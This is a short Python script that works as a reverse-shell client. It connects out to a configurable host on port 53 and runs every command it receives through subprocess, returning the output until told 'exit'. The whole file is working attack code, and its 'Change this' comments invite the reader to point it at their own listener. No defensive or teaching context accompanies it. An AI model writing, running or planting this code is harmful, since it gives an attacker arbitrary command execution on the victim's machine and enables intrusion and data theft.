import socket
import subprocess

SERVER_HOST = "192.168.0.111" # Change this
SERVER_PORT = 53 	# Change this
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
msg = "Connected!\n\n"
s.send(msg.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    if output == "":
        output = "Executed."
    s.send(output.encode())
s.close()
